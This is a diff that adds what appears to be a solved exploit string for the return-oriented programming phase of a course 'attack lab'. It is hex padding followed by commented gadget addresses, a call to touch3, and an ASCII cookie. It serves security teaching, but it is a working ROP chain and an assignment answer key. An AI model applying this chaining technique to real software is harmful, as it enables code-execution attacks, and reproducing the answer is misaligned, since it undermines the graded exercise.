@@ -1,0 +1,16 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+06 1a 40 00 00 00 00 00 /* Jump to 0x401a06, the code is #movq %rsp, %rax; #ret */
+d8 19 40 00 00 00 00 00 /* Jump to 0x4019d8, the code is #add 0x37, %al; #ret */
+c5 19 40 00 00 00 00 00 /* Jump to 0x4019c5, the code is #movq %rax, %rdi; #nop; #ret */
+fa 18 40 00 00 00 00 00 /* Jump to 0x4018fa, address of function touch3 */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 35
+39 62 39 39 37 66 61 00 /* Cookie (as a string) */
+
+
